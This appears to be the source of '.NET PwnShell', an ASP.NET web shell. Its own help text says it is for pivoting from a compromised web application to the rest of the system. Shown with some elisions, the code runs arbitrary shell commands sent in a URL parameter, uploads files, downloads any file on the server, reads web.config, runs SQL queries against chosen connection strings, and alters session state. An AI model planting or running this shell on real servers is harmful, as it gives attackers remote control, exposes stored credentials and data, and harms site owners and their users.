...
<script runat="server">
    ...
    private const string KEY_PWD = "pwd";
    private const string KEY_CMD = "c";
    private const string KEY_DOWNLOAD = "download";
    private const string SESSION_KEY_PWD = "pwnNetPwd";
    private const string SESSION_KEY_CONNSTRING = "pwnNetConnString";

    private string CurrentDirectory
    {
        get
        {
            if (Session[SESSION_KEY_PWD] == null || !System.IO.Directory.Exists(Session[SESSION_KEY_PWD].ToString()))
                Session[SESSION_KEY_PWD] = Environment.CurrentDirectory;
            return Session[SESSION_KEY_PWD].ToString();
        }
        set
        {
            if (System.IO.Directory.Exists(value))
            {
                ...
                throw new Exception("Path is invalid - " + value);
        }
    }

    private string SavedConnectionString
    {
        get { return Session[SESSION_KEY_CONNSTRING].ToString(); }
        set { Session[SESSION_KEY_CONNSTRING] = value; }
    }

    protected void Page_Load(object sender, EventArgs e)
    {
        Environment.CurrentDirectory = CurrentDirectory;
        Response.ExpiresAbsolute = DateTime.Now.AddDays(-1000d);
        Response.Expires = -1500;
        Response.CacheControl = "no-cache";

        //handle downloading seperate since it ends the response early
        string dlPath = Request[KEY_DOWNLOAD];
        if (dlPath != null)
            ProcessDownload(dlPath);

        string cmd = Request[KEY_CMD];
        if (cmd != null)
        {
            try
            {
            ...
            {
                Response.Write(ErrorMessage("Error processing [" + ex.GetType().ToString() + "]: " + cmd + Environment.NewLine + ex.Message));
                try { Response.End(); }
                catch { }
            }
        }
    ...
    protected void btnUpload_Click(object sender, EventArgs e)
    {
        try
        {
            fuUpload.PostedFile.SaveAs(CurrentDirectory + "\\" + fuUpload.FileName);
            lblUploadResult.Text = "Success: " + fuUpload.FileName + " successfully uploaded to " + CurrentDirectory;
            lblUploadResult.ForeColor = System.Drawing.Color.Green;
        }
        catch (Exception ex)
        {
            lblUploadResult.Text = "Failure: " + fuUpload.FileName + " unsuccessfully uploaded to " + CurrentDirectory + ": " + ex.Message;
            lblUploadResult.ForeColor = System.Drawing.Color.Red;
        }
    }

    // Attempts to Download a file using the path.
    private void ProcessDownload(string dlPath)
    {
        StringBuilder sb = new StringBuilder();
        if (System.IO.File.Exists(dlPath))
        {
            Response.Clear();
            //Response.ContentType = GetMimeType(dlPath);
            Response.AddHeader("Content-Disposition", "attachment; filename=" + System.IO.Path.GetFileName(dlPath));
            Response.WriteFile(dlPath);
            Response.End();
        }
        else
        {
            Response.StatusCode = 500;
            Response.Write("Filepath not found: " + Server.HtmlEncode(dlPath));
            Response.End();
        }
    }

    // Process the command line from the user.
    ...
    // Process a command along with its arguments
    private string Process(string cmd, string[] arguments)
    {
        switch (cmd.ToLower())
        {
            case "cd":
                return ChangeDirectory(arguments[0]);
            case "pwd":
                return CurrentDirectory;
            case "dir":
                return Dir(arguments);
            case "session":
                return SessionCmd(arguments);
            case "webconfig":
                return ShowWebConfig();
            case "web.config":
                return ShowWebConfig();
            case "sql":
                return ExecuteSql(arguments);
            default:
                return ExecuteShellCommand(cmd, arguments);
        }
    }

    private string ExecuteSql(string[] args)
    {
        if (args.Length == 0 || args.Length % 2 != 0)
            throw new Exception("Invalid use of SQL command");
        System.Collections.Generic.Dictionary<string, string> sqlDict = new System.Collections.Generic.Dictionary<string, string>();
        for (int i = 0; i < args.Length; i = i + 2)
        {
            if (args[i].ToLower() != "-c" && args[i].ToLower() != "-q")
                throw new Exception("Invalid use of SQL command");
            sqlDict.Add(args[i].ToLower(), args[i + 1]);
        }
        StringBuilder sb = new StringBuilder();
        if (sqlDict.ContainsKey("-c"))
        {
            SavedConnectionString = sqlDict["-c"];
            sb.AppendLine("ConnectionString set to: " + SavedConnectionString);
        }
        if (sqlDict.ContainsKey("-q"))
        {
            if (SavedConnectionString == string.Empty)
                throw new Exception("SQL Error: No connection string has been set");
            System.Data.SqlClient.SqlCommand sqlComm = new System.Data.SqlClient.SqlCommand();
            sqlComm.Connection = new System.Data.SqlClient.SqlConnection(SavedConnectionString);
            sqlComm.CommandText = sqlDict["-q"];
            try
            {
                ...
                else { sb.Append("Command executed successfully and returned no results."); }
            }
            catch { throw; }
    ...
    // Displays the Web Config
    private string ShowWebConfig()
    {
        string webconfig = System.IO.File.ReadAllText(Request.MapPath("~/web.config"));
        return Preformat(Server.HtmlEncode(webconfig));
    }

    // Creates a URL encoded download URL.
    private string CreateDownloadUrl(string path)
    {
        if (System.IO.File.Exists(path))
            return Request.Url.LocalPath + "?" + KEY_DOWNLOAD + "=" + Server.UrlEncode(CurrentDirectory + "\\" + path);
        else
            throw new Exception("Error: File does not exist - " + path);
    }


    System.Threading.AutoResetEvent CmdOutputWaitHandle;
    System.Threading.AutoResetEvent CmdErrorWaitHandle;
    StringBuilder CmdOutput = new StringBuilder();
    StringBuilder CmdError = new StringBuilder();

    private string ExecuteShellCommand(string fileToExecute, string[] arguments)
    {
        string cmdLine = "";
        ...
        if (cmdLine != null && cmdLine.Length > 0)
            args += string.Format(System.Globalization.CultureInfo.InvariantCulture, " {0}", new object[] { cmdLine, System.Globalization.CultureInfo.InvariantCulture });
        ...
        using (System.Diagnostics.Process process = new System.Diagnostics.Process())
        {
            ...
            using (CmdOutputWaitHandle = new System.Threading.AutoResetEvent(false))
            using (CmdErrorWaitHandle = new System.Threading.AutoResetEvent(false))
            {
                process.OutputDataReceived += CmdOutputDataReceived;

                process.ErrorDataReceived += CmdErrorDataReceived;
                ...
                if (process.WaitForExit(timeout) &&
                    CmdOutputWaitHandle.WaitOne(timeout) &&
                    CmdErrorWaitHandle.WaitOne(timeout))
                {
        ...
        {
            throw new Exception(CmdError.ToString());
        }

        return "<pre>" + Server.HtmlEncode(CmdOutput.ToString()) + "</pre>";
    }

    private void CmdOutputDataReceived(object sender, System.Diagnostics.DataReceivedEventArgs e)
    {
        if (e.Data == null)
            CmdOutputWaitHandle.Set();
        else
            CmdOutput.AppendLine(e.Data);
    }

    private void CmdErrorDataReceived(object sender, System.Diagnostics.DataReceivedEventArgs e)
    {
        if (e.Data == null)
            CmdOutputWaitHandle.Set();
        else
            CmdError.AppendLine(e.Data);
    }

    private string ErrorMessage(string message){ return "<span class='error'>" + Server.HtmlEncode(message).Replace(Environment.NewLine, "<br />") + "</span>"; }

    private string SessionCmd(string[] args)
    {
    ...
    // Sets session with either key/value or key/value/type
    private string SetSession(string[] args)
    {
        if (args.Length == 3)
        {
            ...
            string val = args[2];
            Session[key] = val;
            return ShowSession(new string[] { "show", key });
        }
        else if (args.Length == 4)
        {
            ...
            if (cls == "boolean") { foundCls = true; Session[key] = bool.Parse(val); }
            else if (cls == "byte") { foundCls = true; Session[key] = byte.Parse(val); }
            else if (cls == "short") { foundCls = true; Session[key] = short.Parse(val); }
            else if (cls == "int") { foundCls = true; Session[key] = int.Parse(val); }
            else if (cls == "long") { foundCls = true; Session[key] = long.Parse(val); }
            else if (cls == "float") { foundCls = true; Session[key] = float.Parse(val); }
            else if (cls == "double") { foundCls = true; Session[key] = double.Parse(val); }

            if (foundCls)
                return ShowSession(new string[] { "session", key });
        }

        StringBuilder sb = new StringBuilder();
        sb.Append("<span class='error'>Usage: <br/>");
        sb.Append("session set &lt;key&gt; &lt;value&gt; [class]<br /><br />");
        sb.Append("The class option is assumed to be string, but can be substituted for any other primitive, e.g., 'int' or 'float'<br/>");
        sb.Append("</span>");
        return sb.ToString();
    }

    // Shows the values that are currently in Session in a table.
    private string ShowSession(string[] args)
    {
        if (args.Length == 0 || (args.Length == 1 && args[0].ToLower() == "show"))
        {
            StringBuilder sb = new StringBuilder();
            sb.Append("<table cellpadding='5' cellspacing='5'><tbody>");
            sb.Append("<tr><th>Key</th><th>Class</th><th>Value</th></tr>");
        ...
        else if (args.Length == 2)
        {
            ...
            else { sb.Append("<td colspan='3' align='center'>(key not found)</td>"); }
        ...
        throw new Exception("Error executing 'session' command");
    }
    ...
    private string ChangeDirectory(string dir)
    {
        ...
        try
        {
            ...
            if (dir.StartsWith("~"))
                d = new System.IO.DirectoryInfo(Request.MapPath(dir));
            else
                d = new System.IO.DirectoryInfo(CurrentDirectory + System.IO.Path.DirectorySeparatorChar + dir);
            if (d.Exists)
            {
            ...
            {
                d = new System.IO.DirectoryInfo(dir);
                if (d.Exists)
                    CurrentDirectory = d.FullName;
            }
        }
        ...
        {
            returnString = "<span class='error'>Error:<br />" + Server.HtmlEncode(dir) + " - " + ex.Message + "</span>";
        }
    ...
    private string Dir(string[] args)
    {
        ...
        try
        {
            ...
            for (int i = 0; i < args.Length; i++)
            {
                if (!System.IO.File.Exists(args[i]))
                    return "<span class='error'>Cannot find specified file/directory: " + Server.HtmlEncode(args[i]) + "</span>";
                else
                    targets.Add(args[i]);
            }
            ...
            {
                targets.Add("..");
                System.Collections.Generic.List<string> dLst = new System.Collections.Generic.List<string>(System.IO.Directory.GetDirectories(CurrentDirectory));
                System.Collections.Generic.List<string> lst = new System.Collections.Generic.List<string>(System.IO.Directory.GetFiles(CurrentDirectory));

                foreach (string entry in dLst)
                    targets.Add(entry);
            ...
            for (int i = 0, ctr = 0; i < targets.Count; i++, ctr++)
            {
                ...
                if (System.IO.File.Exists(target))
                    fsi = new System.IO.FileInfo(target);
                else
                    fsi = new System.IO.DirectoryInfo(target);

                sb.Append("<td>");
                sb.Append(System.IO.File.GetLastWriteTime(target).ToString("MM/dd/yyyy hh:mm:ss tt").Replace(" ", "&nbsp;"));
                sb.Append("</td><td>");
                sb.Append(fsi is System.IO.DirectoryInfo ? "&lt;DIR&gt;" : "");
                sb.Append("</td>");
                sb.Append("<td style=\"text-align:right;\">");
                sb.Append(fsi is System.IO.FileInfo ? ((System.IO.FileInfo)fsi).Length.ToString("#,##0") : "");
                sb.Append("</td>");
                sb.Append("<td>");
                ...
                if (System.IO.Directory.Exists(target))
                {
                    ...
                    sb.Append("<span class='directory'><a class='dirs' href='javascript:goToDirectory(\"\\\"" + fileName + "\\\"\")'>");
                    sb.Append(Server.HtmlEncode(fileName));
                    sb.Append("</a></span>");
                }
                else
                {
                    string encoded = System.IO.Path.GetFileName(target);
                    sb.Append("<span class='file'><a class='dirs' href='" + CreateDownloadUrl(encoded) + "' target='_blank'>");
                    sb.Append(Server.HtmlEncode(encoded));
                    sb.Append("</a></span>");
                }
                sb.Append("</td>");
                sb.AppendLine("</tr>");
        ...
        {
            returnString = "<span class='error'>Error: " + ex.Message + "</span>";
        }
    ...
    private void AppendToBuffer(IList resultBuffer, StringBuilder buf)
    {
        if (buf.Length > 0)
        {
    ...
    // Parse the command string into the command, followed by arguments in a string array.
    private string[] Tokenize(string commandLine)
    {
        System.Collections.Generic.List<string> resultBuffer = new System.Collections.Generic.List<string>();
        ...
        if (commandLine != null)
        {
            ...
            for (int i = 0; i < z; ++i)
            {
                ...
                else if (c == '\\')
                {
                    if ((z > i + 1)
                        && ((commandLine[i + 1] == '"')
                            || (commandLine[i + 1] == System.IO.Path.DirectorySeparatorChar)))
                    {
    ...
    // Replaces NewLine with breaks for HTML display.
    ...
    // Wrap text in preformatted tags
    private string Preformat(string s)
    {
        return "<pre>" + s + "</pre>";
    }

    // Gets an absolute path including executable from a given exe name.
    // Appends .exe and .cmd if file isn't found.
    private string GetExecutableWithPath(string executableName)
    {
        string[] pathDirs = Environment.SystemDirectory.Split(System.IO.Path.DirectorySeparatorChar);

        string fullyQualifiedExecutable = null;
        foreach (string pathDir in pathDirs)
            if (System.IO.File.Exists(pathDir + System.IO.Path.DirectorySeparatorChar + executableName))
                return pathDir + System.IO.Path.DirectorySeparatorChar + executableName;
            else if (System.IO.File.Exists(pathDir + System.IO.Path.DirectorySeparatorChar + executableName + ".exe"))
                return pathDir + System.IO.Path.DirectorySeparatorChar + executableName + ".exe";
            else if (System.IO.File.Exists(pathDir + System.IO.Path.DirectorySeparatorChar + executableName + ".cmd"))
                return pathDir + System.IO.Path.DirectorySeparatorChar + executableName + ".cmd";
...
<head runat="server">
	...
	<style type="text/css">
		body { font-family:Lucida Console, Courier, Helvetica, Arial; font-size:.75em; color:#fff; }
		.error { color: red; } 
		a:visited { color: red; }
		a:link { color: red; }
		a:active { color: red; }
		a:hover { color: yellow; }
		td { margin:0; padding: 0 .4em 0 0; }
		td .directory a:link { color: #3399FF; }
		td .file a:link, td .file a:visited { color: #FFF; }
		#console { width: 800px; height: 450px; background-color: #22251C; padding: 20px; overflow:auto; }
		#prompt { width: 820px; padding: 10px 0px 10px 20px; background-color: #22251C; }
		#pre_fake_prompt { color: green; }
		#cmd { font-family:Courier, Helvetica, Arial; font-size:1em; width: 400px; border:0; background: #22251C; color:#fff; }
		#upContainer { width:820px; }
		#upContainer p { color:#666666; }
		#upContainer a { color:#3399FF; }
		#upContainer a:hover { color:red; }
		.ui-menu { list-style:none; padding: 2px; margin: 0; display:block; float: left; background-color: #CCCCCC; color: black; }
		.ui-menu .ui-menu { margin-top: -3px; }
		.ui-menu .ui-menu-item { margin:0; padding: 0; zoom: 1; float: left; clear: left; width: 100%; }
		.ui-menu .ui-menu-item a.ui-state-hover,
		.ui-menu .ui-menu-item a.ui-state-active { font-weight: bold; margin: -1px; color: black; }
...
<body onmouseover="setFocus()">
	
	<script type="text/javascript" language="javascript">

    function setFocus() { document.getElementById('cmd').focus(); }
	...
	user = "<%= System.Security.Principal.WindowsIdentity.GetCurrent().Name.ToString().Replace("\\","\\\\") %>";
	host = "<%= System.Environment.MachineName %>";
	pwd = "<%= CurrentDirectory.Replace("\\","\\\\") %>";

	function setPrompt(dir) {
		$("#pre_fake_prompt").html("[" + user + "@" + host + "]");
        $("#fake_prompt").html(dir + "\\>");
	}
	
	basicCmds = [ "help", "dir", "pwd", "cd ", "clear", "cls", "webconfig", "session", "session show", "session set" ];
	hist = [];
    var histIndex = 0;
	welcomeMsg = 	"Welcome to .NET PwnShell! - Inspired by <a target='_new' href='http://i8jesus.com/stuff/pwnshell/'>http://i8jesus.com/stuff/pwnshell</a><br/>" + 
					"==================================================================================";
	...
	function execute(pwd, c) {
		...
		if ( c == 'cls' || c == 'clear' ) {
		...
		} else if ( c.match(/^help/) || c == '?' ) {
		    buff = "This shell is designed to help you pivot from the target";
		    buff += " web application to the rest of the system.<br /><br />";
		    buff += "Here are the shell-specific commands:<br /><br />";
		    buff += "  dir<br />";
		    buff += "  cd [target]<br />";
		    buff += "  cd ~/[target] (for web root relative)<br />";
		    buff += "  pwd<br />";
		    buff += "  web.config | webconfig<br />";
		    buff += "  session show [key]<br />";
		    buff += "  session set [key] [value] [class]<br />";
		    buff += "  sql -c [connectionstring] -q [SQL query]<br />";
		    buff += "  cls<br />";
		    buff += "  clear<br />";
		    buff += "  help<br />";
			...
			$.ajax({
		         url:    document.location.pathname + "?c=" + escape(c),
		         success: function(data) {
	                    ...
	                    if ( c.match(/^ls/) || c.match(/^dir/) ) {
							// remove all the existing directories from autocomplete.
							var entries = [];
							$(".dirs").each(function() {
      							entries.push("cd " + $(this).text());
   							});
							$(".dirs").removeClass("dirs");
							var autoc = [basicCmds.length + entries.length];
							for(var i=0;i<basicCmds.length;i++) autoc[i] = basicCmds[i];
							for(var i=0;i<entries.length;i++) autoc[i+basicCmds.length] = entries[i];
	                    	$("#cmd").autocomplete( "option", "source", autoc );
	                     }
	                  },
		         async:   false
		    });

			// update the pwd if needed
			$.ajax({
		         url:    document.location.pathname + "?c=<%=KEY_PWD %>",
		         success: function(data) {
		                     setPrompt(data.trim());
		                  },
		         async:   false
        ...
        document.getElementById('lblUploadResult').innerHTML = '';
	}
	
	function printMessage(s) {
		var currentHtml = $("#console").html();
		$("#console").html(currentHtml + s + "<br /><br />");
    ...
    <form id="form1" runat="server" onsubmit="return false" defaultbutton="dummyinput">
    <div>
	    <div id="container">
		    <div id="console">
		    ...
		    <div id="prompt">
			    <span id="pre_fake_prompt"></span><br />
                <span id="fake_prompt"></span>
			    <input id="cmd" />
		    </div>
	    </div>
        <asp:Button runat="server" id="dummyinput" onClientClick="return false" style="display:none;" />
...
<script type="text/javascript">document.getElementById('form1').onsubmit = 'return false';</script>
